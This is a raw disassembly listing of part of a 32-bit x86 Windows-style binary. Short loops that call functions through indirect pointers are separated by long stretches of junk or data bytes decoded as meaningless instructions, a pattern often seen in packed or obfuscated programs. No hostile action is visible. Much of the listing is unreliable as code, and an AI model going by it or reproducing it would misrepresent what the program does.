  407450:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407451:	jno    0x407453
  407453:	add    BYTE PTR [ebx],al
  407455:	rol    edi,1
  407457:	add    eax,0x4302c9
  40745c:	dec    ecx
  40745d:	pop    edx
  40745e:	add    BYTE PTR [eax],al
  407460:	cmp    edi,edx
  407462:	mov    DWORD PTR ds:0x43034f,0x6748
  40746c:	jmp    0x40761d
  407471:	not    DWORD PTR [ebp+edx*8-0xca68ae7]
  407478:	push   eax
  407479:	jb     0x4074d4
  40747b:	out    dx,eax
  40747c:	or     bl,ah
  40747e:	add    ecx,DWORD PTR [ebx+0x79]
  407481:	xor    eax,0x8a7e7ec5
  407486:	jg     0x407506
  407488:	jle    0x40743b
  40748a:	jg     0x407500
  40748c:	jns    0x40745c
  40748e:	jg     0x4074ae
  407490:	sbb    dh,cl
  407492:	lock into 
  407494:	push   esp
  407495:	mov    BYTE PTR [esi-0x1f],cl
  407498:	inc    esi
  407499:	arpl   WORD PTR [edi+eiz*4-0x3c],sp
  40749d:	enter  0x3420,0xed
  4074a1:	mov    al,ds:0xc365007d
  4074a6:	mov    ah,0x92
  4074a8:	fld    TBYTE PTR [ebx-0x4110cc1]
  4074ae:	repz popa 
  4074b0:	jle    0x4074ac
  4074b2:	ret    0x4713
  4074b5:	fwait
  4074b6:	sub    esi,ecx
  4074b8:	adc    DWORD PTR [ecx+eax*2],0x67351067
  4074bf:	add    DWORD PTR [ecx+0x61a25086],eax
  4074c5:	mov    bh,BYTE PTR [ebx-0x70]
  4074c8:	fcomp  QWORD PTR [edx]
  4074ca:	xor    al,0xf1
  4074cc:	jne    0x407526
  4074ce:	push   0x2c
  4074d0:	mov    eax,ds:0xc621b933
  4074d5:	ins    BYTE PTR es:[edi],dx
  4074d6:	(bad)  
  4074d7:	out    0xd1,al
  4074d9:	jge    0x407464
  4074db:	test   DWORD PTR [edi-0x681e09ef],edi
  4074e1:	adc    BYTE PTR [edx+0x7d],ch
  4074e4:	mov    ch,0x19
  4074e6:	bound  eax,QWORD PTR [ebp+0x2a6ea09]
  4074ec:	add    al,0xf5
  4074ee:	mov    dh,0xae
  4074f0:	inc    esp
  4074f1:	out    0xbb,eax
  4074f3:	add    DWORD PTR [eax-0x7f53e145],ebx
  4074f9:	adc    esi,DWORD PTR [edx+0x75]
  4074fc:	cmp    DWORD PTR [ebx-0x12],0x36
  407500:	xor    DWORD PTR [ebx+0x63],eax
  407503:	icebp  
  407504:	push   edi
  407505:	imul   ebx,DWORD PTR [edi+0x307288fc],0x1ba2ff39
  40750f:	cmp    BYTE PTR cs:[edx+0x2747941a],ah
  407516:	imul   ebx,DWORD PTR [ebx+0x20],0xcb98aadd
  40751d:	and    cl,BYTE PTR [esi]
  40751f:	dec    esp
  407520:	jg     0x407528
  407522:	adc    al,0x74
  407524:	xor    al,0xf5
  407526:	push   es
  407527:	std    
  407528:	inc    ebp
  407529:	bts    esi,ebp
  40752c:	sbb    eax,0xc9bf451f
  407531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407532:	fisttp DWORD PTR [ebx]
  407534:	pop    edx
  407535:	jb     0x407538
  407537:	cmp    eax,DWORD PTR [ebx-0x35a4d3ed]
  40753d:	mov    dl,0xb5
  40753f:	fdivr  QWORD PTR [esi+0x2f311c54]
  407545:	scas   al,BYTE PTR es:[edi]
  407546:	scas   al,BYTE PTR es:[edi]
  407547:	retf   
  407548:	sub    eax,0x11349cb0
  40754d:	xor    al,0xf4
  40754f:	mov    esi,0x678f41cb
  407554:	in     eax,0x15
  407556:	test   al,0xe6
  407558:	nop
  407559:	test   dl,ch
  40755b:	out    dx,eax
  40755c:	push   esp
  40755d:	push   ds
  40755e:	packssdw mm6,QWORD PTR [ecx+eiz*2-0xe2189e]
  407566:	in     eax,dx
  407567:	sub    eax,0xdf9d297b
  40756c:	fs dec ebx
  40756e:	call   0x1fe754ac
  407573:	das    
  407574:	ret    0x1faa
  407577:	in     al,0xc4
  407579:	pop    ebp
  40757a:	pop    ecx
  40757b:	sub    BYTE PTR [edi-0x575d5129],bl
  407581:	jns    0x40758a
  407583:	sub    al,0xe5
  407585:	arpl   WORD PTR [edx],di
  407587:	int    0x61
  407589:	push   edi
  40758a:	shr    DWORD PTR [ebp+0x11],0xd3
  40758e:	inc    edi
  40758f:	out    dx,al
  407590:	cld    
  407591:	and    eax,0x31f9e5b2
  407596:	add    eax,0x51e6310e
  40759b:	sar    BYTE PTR [ebx+0x135922c9],1
  4075a1:	or     BYTE PTR [eax-0x7888d09b],dh
  4075a7:	sbb    ebp,DWORD PTR [ebx+edx*1-0x5067cc57]
  4075ae:	push   ecx
  4075af:	hlt    
  4075b0:	sub    ebp,DWORD PTR [edi+edi*4-0x5]
  4075b4:	jb     0x40762f
  4075b6:	stos   BYTE PTR es:[edi],al
  4075b7:	cmp    ebx,DWORD PTR [esi]
  4075b9:	adc    ecx,esp
  4075bb:	mov    bl,BYTE PTR [edx-0x4d]
  4075be:	nop
  4075bf:	stc    
  4075c0:	fadd   st,st(0)
  4075c2:	cli    
  4075c3:	sub    al,0xe3
  4075c6:	retf   0x7abe
  4075c9:	adc    BYTE PTR [esi-0x51a33bf4],0xac
  4075d0:	or     al,0x0
  4075d2:	pop    ds
  4075d3:	in     eax,dx
  4075d4:	es daa 
  4075d6:	arpl   WORD PTR [esi+0x4306bff7],sp
  4075dc:	inc    esi
  4075dd:	vprotb ymm6,xmm7,0x33
  4075e2:	(bad)  
  4075e3:	jecxz  0x407623
  4075e5:	lods   eax,DWORD PTR ds:[esi]
  4075e6:	sub    eax,0x258b1cc8
  4075eb:	(bad)  
  4075ec:	in     al,dx
  4075ed:	jmp    0x4075e7
  4075ef:	imul   esi,DWORD PTR [ecx-0x3a],0xffffff88
  4075f3:	pop    ds
  4075f4:	jmp    0xfc7:0x610dc8b2
  4075fb:	mov    ah,0x93
  4075fd:	dec    DWORD PTR [ecx-0x52]
  407600:	cmp    DWORD PTR [ebx-0x3759cdf8],edx
  407606:	adc    BYTE PTR [esi],cl
  407608:	pop    es
  407609:	inc    ebx
  40760a:	std    
  40760b:	jno    0x40761d
  40760d:	pop    edi
  40760e:	outs   dx,BYTE PTR ds:[esi]
  40760f:	(bad)  [esi+eax*2]
  407612:	cmp    eax,0x9e38caa1
  407617:	scas   al,BYTE PTR es:[edi]
  407618:	mov    eax,ds:0x7c17ca2a
  40761d:	je     0x40910e
  407623:	push   ebx
  407624:	jmp    0x408d87
  407629:	and    DWORD PTR ds:0x42ec4b,0x0
  407633:	jmp    0x407647
  407638:	xor    edx,edx
  40763a:	xor    edx,DWORD PTR ds:0x42ec4b
  407640:	inc    edx
  407641:	mov    DWORD PTR ds:0x42ec4b,edx
  407647:	cmp    DWORD PTR ds:0x42ec4b,0x1b
  40764e:	jae    0x40768b
  407654:	cmp    DWORD PTR ds:0x42ec4b,0xa
  40765b:	jne    0x40766a
  407661:	push   DWORD PTR [ebp-0x10]
  407664:	call   DWORD PTR ds:0x42e933
  40766a:	cmp    DWORD PTR ds:0x42ec4b,0x9
  407671:	jne    0x407686
  407677:	xor    edx,edx
  407679:	xor    edx,DWORD PTR ds:0x42ec4b
  40767f:	inc    edx
  407680:	mov    DWORD PTR ds:0x42ec4b,edx
  407686:	jmp    0x407638
  40768b:	mov    edx,DWORD PTR [ebp-0x8]
  40768e:	mov    edi,DWORD PTR [ebp-0x10]
  407691:	sub    edi,edx
  407693:	jmp    0x407844
  407698:	or     DWORD PTR [ecx+0x67a86788],ebp
  40769e:	icebp  
  40769f:	jno    0x407690
  4076a1:	out    dx,al
  4076a2:	jns    0x4076bb
  4076a4:	and    BYTE PTR [edx],ah
  4076a6:	outs   dx,BYTE PTR ds:[esi]
  4076a7:	mov    cl,0x41
  4076a9:	ret    0x7e7e
  4076ac:	mov    bh,BYTE PTR [edi+0x7e]
  4076af:	jle    0x407641
  4076b1:	pop    ss
  4076b2:	adc    ch,bh
  4076b4:	or     al,0x91
  4076b6:	add    al,0x80
  4076b8:	mov    ecx,esp
  4076ba:	mov    dh,0x68
  4076bc:	sub    eax,DWORD PTR [esi+0x6184d4ef]
  4076c2:	jp     0x407647
  4076c4:	aaa    
  4076c5:	call   0x5710940a
  4076ca:	add    esp,DWORD PTR [edi+0x23]
  4076cd:	lods   eax,DWORD PTR ds:[esi]
  4076ce:	adc    DWORD PTR [eax-0x1be237f8],0x27
  4076d5:	pop    esi
  4076d6:	adc    DWORD PTR [eax-0x65],0xd20548dd
  4076dd:	loope  0x4076b1
  4076df:	ins    BYTE PTR es:[edi],dx
  4076e0:	inc    esi
  4076e1:	xor    cl,BYTE PTR [edi-0x25]
  4076e4:	and    al,0xc3
  4076e6:	lock test eax,0x399ea903
  4076ec:	std    
  4076ed:	push   0x2c
  4076ef:	test   edx,esi
  4076f1:	mov    edi,0x407a0afc
  4076f6:	call   0xe7c1ca33
  4076fb:	retf   
  4076fc:	inc    esi
  4076fd:	add    al,0x4a
  4076ff:	cld    
  407700:	jmp    0x220acf60
  407705:	adc    al,0xa8
  407707:	dec    ecx
  407708:	fisubr WORD PTR [bx+0x2da6]
  40770d:	add    bh,bl
  40770f:	push   ebp
  407710:	repz add eax,0xb2248ae2
  407716:	lahf   
  407717:	dec    esp
  407718:	sbb    eax,0xe534f655
  40771d:	out    dx,al
  40771e:	pmullw mm7,QWORD PTR [edx+0x12]
  407722:	retf   0xa823
  407725:	adc    bl,BYTE PTR [edx]
  407727:	xchg   DWORD PTR [edi+0x67],esp
  40772a:	jmp    0x40775d
  40772c:	push   ebx
  40772d:	add    al,0xe5
  40772f:	jmp    0x407780
  407731:	(bad)  
  407732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407733:	push   esp
  407734:	push   ebx
  407735:	xor    DWORD PTR [edi-0x47b7c460],0xbabc7d23
  40773f:	loopne 0x407729
  407741:	xchg   edi,eax
  407742:	call   0xf5c5:0x87460f02
  407749:	clc    
  40774a:	cs out 0x41,eax
  40774d:	lods   eax,DWORD PTR ds:[esi]
  40774e:	retf   0x8e3f
  407751:	or     eax,0x221e4ad1
  407756:	popf   
  407757:	pop    ecx
  407758:	in     eax,0x64
  40775a:	jne    0x4076ff
  40775c:	jp     0x407738
  40775e:	sub    al,0x6e
  407760:	(bad)  
  407761:	out    dx,al
  407762:	adc    eax,0xe1c0bb91
  407767:	popf   
  407768:	pop    eax
  407769:	sti    
  40776a:	push   edx
  40776b:	dec    edi
  40776c:	ret    
  40776d:	gs jle 0x40776a
  407770:	cmc    
  407771:	inc    DWORD PTR [eax]
  407773:	or     edx,edx
  407775:	xchg   edx,eax
  407776:	fst    DWORD PTR ds:0x9c6565f
  40777c:	ret    
  40777d:	inc    esp
  40777e:	jae    0x40771f
  407780:	pop    ebp
  407781:	pusha  
  407782:	sar    BYTE PTR [edi],cl
  407784:	sbb    eax,0x5729c52f
  407789:	cli    
  40778a:	add    eax,0xf3fc9a0
  40778f:	push   edi
  407790:	adc    al,0x61
  407792:	leave  
  407793:	inc    esp
  407794:	sti    
  407795:	push   cs
  407796:	(bad)  
  407797:	in     eax,dx
  407798:	stos   DWORD PTR es:[edi],eax
  407799:	push   ds
  40779a:	xor    esp,DWORD PTR [ecx]
  40779c:	xchg   ecx,eax
  40779d:	sub    dh,0x80
  4077a0:	jmp    0x407744
  4077a2:	daa    
  4077a3:	fs scas eax,DWORD PTR es:[edi]
  4077a5:	ss inc ebp
  4077a7:	adc    edx,DWORD PTR [ebx+eax*2+0x7d]
  4077ab:	shl    DWORD PTR ds:0xb32ef47f,1
  4077b1:	mov    ds:0x4efa8fba,eax
  4077b6:	sub    DWORD PTR [ecx+0x22],ebp
  4077b9:	test   BYTE PTR [esi],cl
  4077bb:	pop    ebx
  4077bc:	loopne 0x4077d5
  4077be:	mov    dh,0xcd
  4077c0:	xor    bh,ah
  4077c2:	mov    dl,0x27
  4077c4:	sbb    BYTE PTR [edx+0x39f89e8d],dh
  4077ca:	jb     0x4077c5
  4077cc:	push   0xffffffb9
  4077ce:	fild   WORD PTR [ecx+0x65]
  4077d1:	xchg   ebp,eax
  4077d2:	dec    esi
  4077d3:	jle    0x4077af
  4077d5:	aaa    
  4077d6:	fnstcw WORD PTR [ecx-0x2a87489f]
  4077dc:	pop    eax
  4077dd:	xlat   BYTE PTR ds:[ebx]
  4077de:	or     eax,0xe4f0a82c
  4077e3:	nop
  4077e4:	dec    esi
  4077e5:	aam    0x32
  4077e7:	clc    
  4077e8:	in     al,0x8
  4077ea:	sti    
  4077eb:	sub    eax,0x1062f7b6
  4077f0:	idiv   edx
  4077f2:	xor    edx,DWORD PTR [ebx+ebx*4]
  4077f5:	mov    dl,0x44
  4077f7:	repz aaa 
  4077f9:	das    
  4077fa:	leave  
  4077fb:	sbb    al,dh
  4077fd:	aam    0xc6
  4077ff:	imul   DWORD PTR [ebx]
  407801:	adc    al,0x3d
  407803:	(bad)  ds:0x981e3d14
  407809:	sbb    dh,BYTE PTR [ebx+0x41e73ac9]
  40780f:	or     DWORD PTR [ebx],esp
  407811:	out    dx,eax
  407812:	push   ebx
  407813:	push   eax
  407814:	ins    DWORD PTR es:[edi],dx
  407815:	inc    esi
  407816:	or     dl,BYTE PTR [ebp+0x19]
  407819:	dec    edx
  40781a:	pop    eax
  40781b:	jp     0x40786c
  40781d:	(bad)
  407821:	dec    esp
  407822:	ret    
  407823:	jns    0x40781a
  407825:	mov    ds:0xc58b3799,eax
  40782a:	outs   dx,BYTE PTR ds:[esi]
  40782b:	stos   DWORD PTR es:[edi],eax
  40782c:	repnz nop
  40782e:	xchg   esi,eax
  40782f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407830:	je     0x4077ed
  407832:	or     DWORD PTR [ebp+edx*2-0x3],0x3b
  407837:	icebp  
  407838:	outs   dx,DWORD PTR ds:[esi]
  407839:	cmp    eax,0x4011a7b0
  40783e:	mov    ah,0x88
  407840:	std    
  407841:	push   es
  407842:	cmp    al,0x23
  407844:	mov    edx,DWORD PTR [ebp-0x4]
  407847:	adc    DWORD PTR ds:0x4302c9,0x43034f
  407851:	xor    edx,eax
  407853:	add    edx,ecx
  407855:	cmp    edi,edx
  407857:	mov    DWORD PTR ds:0x4302ed,0x688e
  407861:	jb     0x40910d
  407867:	mov    DWORD PTR ds:0x42e644,0x1e
  407871:	cmp    DWORD PTR ds:0x42e644,0x0
  407878:	je     0x4078a9
  40787e:	cmp    DWORD PTR ds:0x42e644,0x25
  407885:	jne    0x407896
  40788b:	push   0x2141
  407890:	call   DWORD PTR ds:0x42e937
  407896:	mov    edi,DWORD PTR ds:0x42e644
  40789c:	dec    edi
  40789d:	mov    DWORD PTR ds:0x42e644,edi
  4078a3:	jmp    0x407871
  4078a8:	inc    edx
  4078a9:	mov    edx,DWORD PTR [ebp-0x28]
  4078ac:	mov    edi,DWORD PTR [ebp-0x4]
  4078af:	xor    edx,eax
  4078b1:	xor    edi,eax
  4078b3:	sub    ebx,DWORD PTR ds:0x42ec4f
  4078b9:	add    edi,ecx
  4078bb:	add    edx,ecx
  4078bd:	and    DWORD PTR ds:0x4302bd,0x0
  4078c7:	xor    ebx,ebx
  4078c9:	or     ebx,DWORD PTR ds:0x4302bd
  4078cf:	inc    ebx
  4078d0:	mov    DWORD PTR ds:0x4302bd,ebx
  4078d6:	cmp    DWORD PTR ds:0x4302bd,0x15
  4078dd:	jne    0x4078f1
  4078e3:	push   0x1
  4078e5:	push   DWORD PTR [ebp-0x20]
  4078e8:	push   DWORD PTR [ebp-0x10]
  4078eb:	call   DWORD PTR ds:0x42eaa7
  4078f1:	cmp    DWORD PTR ds:0x4302bd,0x11
  4078f8:	jb     0x4078c7
  4078fe:	imul   edx,edi
  407901:	mov    edi,DWORD PTR [ebp-0x8]
  407904:	mov    ebx,DWORD PTR [ebp-0x10]
  407907:	sub    ebx,edi
  407909:	cmp    ebx,edx
  40790b:	ja     0x40791d
  407911:	mov    edx,DWORD PTR [ebp-0x4]
  407914:	xor    edx,eax
  407916:	add    edx,ecx
  407918:	jmp    0x40877e
  40791d:	mov    edx,DWORD PTR [ebp-0x2c]
  407920:	mov    edi,DWORD PTR [ebp-0x4]
  407923:	xor    edx,eax
  407925:	xor    edi,eax
  407927:	add    edi,ecx
  407929:	add    edx,ecx
  40792b:	imul   edx,edi
  40792e:	mov    edi,DWORD PTR [ebp-0x8]
  407931:	jmp    0x407ae2
  407936:	ret    0x1100
  407939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793a:	shl    DWORD PTR [ebp+0x7ad26172],1
  407940:	dec    edi
  407941:	call   edx
  407943:	pushf  
  407944:	ja     0x40796b
  407946:	ffree  st(0)
  407948:	jle    0x4079c8
  40794a:	mov    bh,BYTE PTR [edi+0x7e]
  40794d:	jle    0x407925
  40794f:	icebp  
  407950:	xchg   edx,eax
  407951:	imul   ecx,eax,0xffffff99
  407954:	jmp    0x40799f
  407956:	pop    edi
  407957:	rcr    esi,1
  407959:	xchg   esp,eax
  40795a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40795b:	dec    ebx
  40795c:	ja     0x40795e
  40795e:	lds    esp,FWORD PTR [ebp+ebp*1-0x5a]
  407962:	push   ebp
  407963:	out    0x2b,eax
  407965:	sbb    DWORD PTR [esi+0x3f0f1ea0],edi
  40796b:	data16 cld 
  40796d:	push   edx
  40796e:	mov    edi,0x49e2bbe
  407973:	cmp    dh,0x98
  407976:	and    eax,0xd2f10ddd
  40797b:	mov    eax,ds:0x877dfa14
  407980:	sbb    eax,DWORD PTR [ecx]
  407982:	(bad)  
  407983:	ficomp DWORD PTR [eax-0x51]
  407986:	add    ch,BYTE PTR [ebx+0x1ed62a33]
  40798c:	or     bh,BYTE PTR [ecx-0x30721d03]
  407992:	sbb    al,BYTE PTR [ecx+ecx*1]
  407995:	imul   ebp,DWORD PTR [eax-0x38],0xc6ad0e93
  40799c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40799d:	add    eax,0x552bb16b
  4079a2:	aas    
  4079a3:	push   ebp
  4079a4:	or     al,0x71
  4079a6:	sbb    eax,eax
  4079a8:	jle    0x407a27
  4079aa:	xchg   DWORD PTR ds:0xe16a3542,edi
  4079b0:	jmp    0x4cb095e
  4079b5:	xor    ecx,DWORD PTR [eax-0x52e66834]
  4079bb:	repz mov ah,0xf3
  4079be:	dec    esp
  4079bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079c0:	imul   ebp,DWORD PTR [edi],0x43
  4079c3:	inc    eax
  4079c4:	ins    BYTE PTR es:[edi],dx
  4079c5:	inc    esp
  4079c6:	cmp    ebx,DWORD PTR [ecx+eax*4]
  4079c9:	rol    DWORD PTR [edx-0x79],0x89
  4079cd:	jns    0x4079f3
  4079cf:	xchg   esp,eax
  4079d0:	js     0x407967
  4079d2:	fdiv   QWORD PTR [esi-0x724b2c06]
  4079d8:	(bad)  
  4079d9:	int    0xf8
  4079db:	bound  edi,QWORD PTR [edx+0x660f4df8]
  4079e1:	out    0xd5,al
  4079e3:	sbb    al,0xd4
  4079e5:	mov    DWORD PTR [ebp+0x5892aa5d],ebx
  4079eb:	leave  
  4079ec:	call   0x718f:0x63a654fc
  4079f3:	adc    eax,0xb772bddb
  4079f8:	mov    ebp,0xf3c18e9
  4079fd:	push   cs
  4079fe:	cmp    al,0xff
  407a00:	outs   dx,DWORD PTR ds:[esi]
  407a01:	mov    edi,cs
  407a03:	idiv   edi
  407a05:	or     edi,DWORD PTR [ebp+0x6e5724e4]
  407a0b:	push   ecx
  407a0c:	cmp    cl,BYTE PTR [esi]
  407a0e:	add    eax,0xba3562c4
  407a13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a14:	xchg   ebx,eax
  407a15:	in     eax,dx
  407a16:	jl     0x4079f9
  407a18:	mov    bh,0x30
  407a1a:	xchg   edi,eax
  407a1b:	sub    cl,BYTE PTR [edi+0x6892c466]
  407a21:	icebp  
  407a22:	data16 repz test al,0xe6
  407a26:	jb     0x407a3e
  407a28:	lods   al,BYTE PTR ds:[esi]
  407a29:	pop    edi
  407a2a:	ret    
  407a2b:	mov    dh,0x5
  407a2d:	and    DWORD PTR [eax+0x7e],edi
  407a30:	shl    DWORD PTR [ebp-0x3d],cl
  407a33:	mov    BYTE PTR [edi+0x79],ah
  407a36:	pop    ss
  407a37:	xor    eax,0xbd0d2fa8
  407a3c:	jmp    0x6703992a
  407a41:	ret    
  407a42:	(bad)  
  407a43:	pop    ebp
  407a44:	pusha  
  407a45:	push   0xf5070ec0
  407a4a:	(bad)  
  407a4b:	cmp    edx,DWORD PTR [edi-0x5af40894]
  407a51:	lahf   
  407a52:	sub    eax,0x8dca7459
  407a57:	pop    eax
  407a58:	loope  0x407a25
  407a5a:	and    ah,BYTE PTR [eax]
  407a5c:	sub    ecx,DWORD PTR [esp+edi*2+0x18]
  407a60:	cmp    eax,0xaed7e973
  407a65:	add    al,0x8e
  407a67:	loope  0x407ad4
  407a69:	stos   BYTE PTR es:[edi],al
  407a6a:	push   esp
  407a6b:	or     eax,0xf96b2f6e
  407a70:	xchg   ebx,eax
  407a71:	lea    ebx,[esi]
  407a73:	pusha  
  407a74:	out    0x24,al
  407a76:	cmp    al,0x4a
  407a78:	push   0xffffff83
  407a7a:	loope  0x407a79
  407a7c:	in     eax,dx
  407a7d:	(bad)  
  407a7e:	xor    al,ah
  407a80:	jnp    0x407a65
  407a82:	push   edx
  407a83:	ror    DWORD PTR [ebp+edi*2+0x38a1b45f],0x15
  407a8b:	adc    al,dl
  407a8d:	mov    al,0x7a
  407a8f:	enter  0xeee5,0x76
  407a93:	fst    DWORD PTR [edi+0x70]
  407a96:	frstor [ebx]
  407a98:	jne    0x407ade
  407a9a:	in     al,0xf1
  407a9c:	add    eax,0x3f6d66b2
  407aa1:	arpl   WORD PTR [bp+si-0x3915],sp
  407aa6:	xchg   edi,eax
  407aa7:	dec    ecx
  407aa8:	mov    ebp,0x4e6d29f9
  407aad:	sub    DWORD PTR [edi+edi*4-0x54],ecx
  407ab1:	into   
  407ab2:	pop    ecx
  407ab3:	(bad)  
  407ab4:	jmp    0x507b7fed
  407ab9:	(bad)  
  407aba:	cld    
  407abb:	fcmovnu st,st(5)
  407abd:	and    cl,dl
  407abf:	sub    al,0xb3
  407ac1:	sub    eax,0xe30fd124
  407ac6:	mov    ah,0xb8
  407ac8:	mov    dl,0x8f
  407aca:	xchg   edx,eax
  407acb:	and    ah,BYTE PTR [ebp+0x2f]
  407ace:	push   eax
  407acf:	outs   dx,BYTE PTR ds:[esi]
  407ad0:	dec    ebx
  407ad1:	pop    es
  407ad2:	adc    eax,0x72679d0c
  407ad7:	out    0x54,eax
  407ad9:	mov    bh,0x6c
  407adb:	sub    ebp,DWORD PTR [ebp+0x244dab90]
  407ae1:	xlat   BYTE PTR ds:[ebx]
  407ae2:	mov    ebx,DWORD PTR [ebp-0x10]
  407ae5:	sub    ebx,edi
  407ae7:	cmp    ebx,edx
  407ae9:	ja     0x407af7
  407aef:	mov    edx,DWORD PTR [ebp-0x28]
  407af2:	jmp    0x408770
  407af7:	mov    edx,DWORD PTR [ebp-0x30]
  407afa:	mov    edi,DWORD PTR [ebp-0x4]
  407afd:	jmp    0x407cae
  407b02:	mov    WORD PTR [edx+0x6130bf0c],?
  407b08:	dec    ebp
  407b09:	jno    0x407ae6
  407b0b:	les    ecx,FWORD PTR [esi-0x288a8136]
  407b11:	mov    ch,BYTE PTR [ecx-0x3f]
  407b14:	jle    0x407b94
  407b16:	mov    bh,BYTE PTR [edi+0x7e]
  407b19:	jle    0x407aae
  407b1b:	adc    al,0x73
  407b1d:	pop    ss
  407b1e:	js     0x407b2d
  407b20:	fstp   QWORD PTR [ebx-0x2f794b4e]
  407b26:	adc    al,0xb4
  407b28:	ins    BYTE PTR es:[edi],dx
  407b29:	sbb    edx,ecx
  407b2b:	jno    0x407b9d
  407b2d:	retf   
  407b2e:	mov    esp,0xa6e2260a
  407b33:	js     0x407ab6
  407b35:	sub    eax,0xe080ecd
  407b3a:	nop    DWORD PTR [ecx+0x7308457]
  407b41:	xchg   edx,eax
  407b42:	jbe    0x407bb5
  407b44:	lods   al,BYTE PTR ds:[esi]
  407b45:	div    BYTE PTR [esi+0x5f]
  407b48:	add    BYTE PTR [esi+0x4a],0xc2
  407b4c:	inc    ecx
  407b4d:	mov    ah,0x8f
  407b4f:	mov    cl,0x39
  407b51:	cdq    
  407b52:	sbb    ch,bl
  407b54:	in     eax,0xf6
  407b56:	and    al,0x3c
  407b58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b59:	adc    dh,BYTE PTR [ebx+0x3a440154]
  407b5f:	sbb    BYTE PTR [edx+edi*2-0x24d4660c],0xd7
  407b67:	push   esi
  407b68:	pusha  
  407b69:	adc    dl,BYTE PTR [edi]
  407b6b:	dec    ebp
  407b6c:	lea    esi,[edi]
  407b6e:	fwait
  407b6f:	mov    edx,0x18f9fce0
  407b74:	shl    DWORD PTR [ebx],cl
  407b76:	(bad)  
  407b77:	stos   BYTE PTR es:[edi],al
  407b78:	cwde   
  407b79:	pop    es
  407b7a:	pop    ecx
  407b7b:	in     eax,dx
  407b7c:	iret   
  407b7d:	dec    ebx
  407b7e:	nop
  407b7f:	jmp    DWORD PTR [edi]
  407b81:	dec    esi
  407b82:	test   al,0xe0
  407b84:	jnp    0x407bf3
  407b86:	iret   
  407b87:	mov    ebx,0x4a8a0994
  407b8c:	in     al,dx
  407b8d:	xchg   ecx,eax
  407b8e:	mov    esp,0xa1d4e1c
  407b93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b94:	scas   al,BYTE PTR es:[edi]
  407b95:	je     0x407b92
  407b97:	cld    
  407b98:	cmp    DWORD PTR [ebx-0x7e],edi
  407b9b:	xchg   ecx,eax
  407b9c:	sbb    al,BYTE PTR [edi+0x6fe79d8d]
  407ba2:	imul   edi,DWORD PTR [edi-0x1c],0xfb6e1a59
  407ba9:	sub    esi,DWORD PTR [edi-0x68411934]
  407baf:	or     bl,BYTE PTR [ecx]
  407bb1:	xchg   ebx,eax
  407bb2:	cmp    eax,0x2edcc8fb
  407bb7:	cmp    edi,DWORD PTR [eax+0x1bc21547]
  407bbd:	and    dh,BYTE PTR [ebp+0x6e58077]
  407bc3:	retf   
  407bc4:	pop    edx
  407bc5:	cs or  ebp,edi
  407bc8:	lea    ebx,[edx-0x67]
  407bcb:	pushf  
  407bcc:	xor    eax,0x89c1e244
  407bd1:	fsub   DWORD PTR [edi+0x5f]
  407bd4:	sub    DWORD PTR [edx-0x39],esi
  407bd7:	(bad)  
  407bd9:	inc    esi
  407bda:	ret    0x4efe
  407bdd:	bound  edx,QWORD PTR [esi]
  407bdf:	lahf   
  407be0:	pop    es
  407be1:	popa   
  407be2:	aas    
  407be3:	dec    edi
  407be4:	add    ecx,edx
  407be6:	jp     0x407bc6
  407be8:	test   DWORD PTR [edx],ecx
  407bea:	mov    ds:0xc7de2376,eax
  407bef:	fsub   QWORD PTR [edx]
  407bf1:	dec    ebp
  407bf2:	pop    ebx
  407bf3:	sub    al,bl
  407bf5:	int    0x5d
  407bf7:	ffreep st(1)
  407bf9:	cwde   
  407bfa:	enter  0x910d,0x9a
  407bfe:	pop    edi
  407bff:	pop    es
  407c00:	retf   0x37d1
  407c03:	mov    eax,es:0x51da73f3
  407c09:	xor    eax,0xbcee3431
  407c0e:	int    0x1
  407c10:	dec    edx
  407c11:	lahf   
  407c12:	addr16 push ss
  407c14:	inc    edi
  407c15:	cld    
  407c16:	mov    BYTE PTR [ebx],0x19
  407c19:	out    dx,al
  407c1a:	jno    0x407bda
  407c1c:	call   0xf11c113d
  407c21:	adc    esi,ecx
  407c23:	push   esp
  407c24:	out    dx,al
  407c25:	in     al,0x33
  407c27:	in     al,dx
  407c28:	pusha  
  407c29:	mul    DWORD PTR [ebx]
  407c2b:	add    edi,0x6e7f76f1
  407c31:	xor    BYTE PTR [edi],cl
  407c33:	mov    dl,0xff
  407c35:	sbb    eax,0x8d3175b1
  407c3a:	test   eax,0xa2988a40
  407c3f:	sub    ah,ch
  407c41:	inc    ebx
  407c42:	enter  0x5279,0xc0
  407c46:	lahf   
  407c47:	inc    BYTE PTR [ecx*1-0x382747b3]
  407c4e:	ja     0x407c2e
  407c50:	pop    es
  407c51:	mov    bh,0xd5
  407c53:	aam    0x57
  407c55:	call   DWORD PTR [esi+0xd3a231f]
  407c5b:	adc    cl,BYTE PTR [eax]
  407c5d:	xchg   edx,eax
  407c5e:	test   DWORD PTR [ebp-0x69fa5db],ebx
  407c64:	mov    DWORD PTR [ebp-0x476abc3b],ebp
  407c6a:	mov    ah,0xaa
  407c6c:	push   eax
  407c6d:	sub    DWORD PTR [ecx],0xffffffa5
  407c70:	into   
  407c71:	pop    ds
  407c72:	push   ds
  407c73:	test   DWORD PTR [ebp-0x57],0xdab148c5
  407c7a:	retf   0x71bc
  407c7d:	jno    0x407c1c
  407c7f:	adc    BYTE PTR [edx+0x2aa871c2],dh
  407c85:	out    dx,al
  407c86:	inc    edx
  407c87:	rcl    BYTE PTR [ecx+0x3c],0x44
  407c8b:	in     al,0xdb
  407c8d:	lock cdq 
  407c8f:	xchg   esp,eax
  407c90:	jle    0x407c40
  407c92:	or     eax,0x968834d
  407c97:	out    dx,eax
  407c98:	(bad)  
  407c99:	out    dx,al
  407c9a:	addr16 repz and ah,ah
  407c9e:	mov    edi,0x4dbf6609
  407ca3:	xlat   BYTE PTR ds:[ebx]
  407ca4:	dec    ebx
  407ca5:	pop    esp
  407ca6:	adc    eax,0x57eea3b1
  407cab:	pop    esi
